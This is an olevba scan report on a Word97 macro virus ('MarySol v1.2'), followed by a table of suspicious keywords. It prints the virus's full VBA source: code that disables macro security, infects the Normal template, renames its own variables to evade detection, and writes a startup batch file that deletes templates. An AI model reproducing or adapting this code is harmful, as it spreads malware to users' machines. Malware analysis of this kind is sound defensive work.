olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mary.b-05e93fe468f1882b6d76c5f9e42a1d30039e713e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mary.b-05e93fe468f1882b6d76c5f9e42a1d30039e713e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Word97.MarySol v1.2
'(c) 1999 cry0tek

Private Sub Document_Close()
'MarySol
On Error Resume Next
Dim varray(1 To 14) As String
Dim Pq7Cq4Ne2Qm3Iu9Ah8 As Long: Dim Bm7Oq7Dq7Im2Of5Xp8La2 As Long: Dim Uj3Wv2Lx6Ti7Sl2Yo6 As Long: Dim Lc8Fx6Mh6Xu6Rr8 As Long
If Left(Application.Version, 1) > 9 Then
 CommandBars("Macro").Controls("Security...").Delete
 System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
 Options.VirusProtection = (1 - 1)
End If
FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
Options.SaveNormalPrompt = (1 - 1): Options.ConfirmConversions = (1 - 1): Application.EnableCancelKey = (1 - 1)
Application.ScreenUpdating = (1 - 1): Application.ShowVisualBasicEditor = (1 - 1)
If System.OperatingSystem = "Windows" And System.LanguageDesignation = "English (United States)" Then
 Xv1Mm7Me3 = GetAttr(NormalTemplate.FullName)
 If Xv1Mm7Me3 = vbReadOnly Then GoTo Qh1Qm4Vk4Pw8Of0
 If Xv1Mm7Me3 = vbReadOnly + vbArchive Then GoTo Qh1Qm4Vk4Pw8Of0
End If
Set Fc5Sq2Ad3Pd8Gi2Bm0 = ActiveDocument.VBProject.VBComponents.Item(1).Codemodule
Set Jh5Bn2Mb3Eq8Ka0Pw1Sf7 = NormalTemplate.VBProject.VBComponents.Item(1).Codemodule
If Fc5Sq2Ad3Pd8Gi2Bm0.Lines(5, 1) <> "'MarySol" Then
 Fc5Sq2Ad3Pd8Gi2Bm0.DeleteLines 1, _
 Fc5Sq2Ad3Pd8Gi2Bm0.CountOfLines
 Fc5Sq2Ad3Pd8Gi2Bm0.InsertLines 1, Jh5Bn2Mb3Eq8Ka0Pw1Sf7.Lines _
 (1, Jh5Bn2Mb3Eq8Ka0Pw1Sf7.CountOfLines)
 Fc5Sq2Ad3Pd8Gi2Bm0.ReplaceLine 4, Chr(80) + Chr(114) + Chr(105) + Chr(118) + Chr(97) + Chr(116) + Chr(101) + Chr(32) + _
 Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + _
 Chr(110) + Chr(116) + Chr(95) + Chr(79) + Chr(112) + Chr(101) + Chr(110) + Chr(40) + Chr(41)
End If
If Jh5Bn2Mb3Eq8Ka0Pw1Sf7.Lines(5, 1) <> "'MarySol" Then
 Randomize
 varray(1) = "Xv1Mm7Me3": varray(2) = "Fc5Sq2Ad3Pd8Gi2Bm0": varray(3) = "Jh5Bn2Mb3Eq8Ka0Pw1Sf7": varray(4) = "Pq7Cq4Ne2Qm3Iu9Ah8": varray(5) = "Bm7Oq7Dq7Im2Of5Xp8La2": varray(6) = "Uj3Wv2Lx6Ti7Sl2Yo6": varray(7) = "Lc8Fx6Mh6Xu6Rr8"
 varray(8) = "Qh1Qm4Vk4Pw8Of0": varray(9) = "Mf3": varray(10) = "Kz6Px6Ur7Nt1Bk1Ob6Cs9": varray(11) = "Xz5Lg8": varray(12) = "Xs8Pc5Mk5Kx5Ry8Mj9Hv5Rs7Fm8": varray(13) = "Rb5Yy3Wj5Iz5Fh0Ay4Dq6": varray(14) = "Vu2Rv2Ni4"
 For i = 1 To 14
  For j = 1 To Int((10 * Rnd) + 1)
   PolyVal = PolyVal + Chr(65 + Int(Rnd * 26)) & Chr(122 - Int(Rnd * 26)) & Chr(48 + Int(Rnd * 10))
  Next j
  With Fc5Sq2Ad3Pd8Gi2Bm0
   Pq7Cq4Ne2Qm3Iu9Ah8 = 1: Bm7Oq7Dq7Im2Of5Xp8La2 = 1: Uj3Wv2Lx6Ti7Sl2Yo6 = .CountOfLines: Lc8Fx6Mh6Xu6Rr8 = Len(.Lines(.CountOfLines, 1))
   Do While .Find(varray(i), Pq7Cq4Ne2Qm3Iu9Ah8, Bm7Oq7Dq7Im2Of5Xp8La2, Uj3Wv2Lx6Ti7Sl2Yo6, Lc8Fx6Mh6Xu6Rr8, True)
    strVal = .Lines(Pq7Cq4Ne2Qm3Iu9Ah8, 1)
    strVal = Left(strVal, Bm7Oq7Dq7Im2Of5Xp8La2 - 1) & PolyVal & Mid(strVal, Lc8Fx6Mh6Xu6Rr8)
    .ReplaceLine Pq7Cq4Ne2Qm3Iu9Ah8, strVal
    Pq7Cq4Ne2Qm3Iu9Ah8 = Uj3Wv2Lx6Ti7Sl2Yo6 + 1: Bm7Oq7Dq7Im2Of5Xp8La2 = 1
    Uj3Wv2Lx6Ti7Sl2Yo6 = .CountOfLines: Lc8Fx6Mh6Xu6Rr8 = Len(.Lines(.CountOfLines, 1))
   Loop
  End With
  PolyVal = ""
 Next i
 Jh5Bn2Mb3Eq8Ka0Pw1Sf7.DeleteLines 1, _
 Jh5Bn2Mb3Eq8Ka0Pw1Sf7.CountOfLines
 Jh5Bn2Mb3Eq8Ka0Pw1Sf7.InsertLines 1, Fc5Sq2Ad3Pd8Gi2Bm0.Lines _
 (1, Fc5Sq2Ad3Pd8Gi2Bm0.CountOfLines)
 Jh5Bn2Mb3Eq8Ka0Pw1Sf7.ReplaceLine 4, Chr(80) + Chr(114) + Chr(105) + Chr(118) + Chr(97) + Chr(116) + Chr(101) + Chr(32) + _
 Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + _
 Chr(110) + Chr(116) + Chr(95) + Chr(67) + Chr(108) + Chr(111) + Chr(115) + Chr(101) + Chr(40) + Chr(41)
End If
If Jh5Bn2Mb3Eq8Ka0Pw1Sf7.CountOfLines <> 0 And Fc5Sq2Ad3Pd8Gi2Bm0.CountOfLines = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
If Day(Now) = Minute(Now) Then
 Select Case Day(Now)
  Case 3 And Int((15 * Rnd) + 1) = 1
   Application.StatusBar = "Word97.MarySol v1.2"
  Case 12 And Int((30 * Rnd) + 1) = 1
   With Assistant.NewBalloon
    .Heading = "Word97.MarySol v1.2"
    .Text = "So many questions, but the answers are so few..." & vbCr & vbCr
    .Animation = 22
    .Show
   End With
  Case 21 And Int((45 * Rnd) + 1) = 1
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoClose") = 1&
 End Select
End If
Exit Sub
Qh1Qm4Vk4Pw8Of0:
Mf3 = NormalTemplate
Vu2Rv2Ni4 = "c:\windows\startm~1\programs\startup\msexec.bat"
Kz6Px6Ur7Nt1Bk1Ob6Cs9 = "attrib -h -r "
Xz5Lg8 = "c:\progra~1\micros~1\templa~1\"
Xs8Pc5Mk5Kx5Ry8Mj9Hv5Rs7Fm8 = "c:\progra~1\micros~2\templa~1\"
Rb5Yy3Wj5Iz5Fh0Ay4Dq6 = "del "
Open Vu2Rv2Ni4 For Append Access Write As #1
Print #1, vbCr + vbLf + "@echo off"
Print #1, Kz6Px6Ur7Nt1Bk1Ob6Cs9 + Xz5Lg8 + Mf3
Print #1, Kz6Px6Ur7Nt1Bk1Ob6Cs9 + Xs8Pc5Mk5Kx5Ry8Mj9Hv5Rs7Fm8 + Mf3
Print #1, Rb5Yy3Wj5Iz5Fh0Ay4Dq6 + Xz5Lg8 + Mf3
Print #1, Rb5Yy3Wj5Iz5Fh0Ay4Dq6 + Xs8Pc5Mk5Kx5Ry8Mj9Hv5Rs7Fm8 + Mf3
Print #1, "cls"
Print #1, Rb5Yy3Wj5Iz5Fh0Ay4Dq6 + Vu2Rv2Ni4
Close 1
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |msexec.bat          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

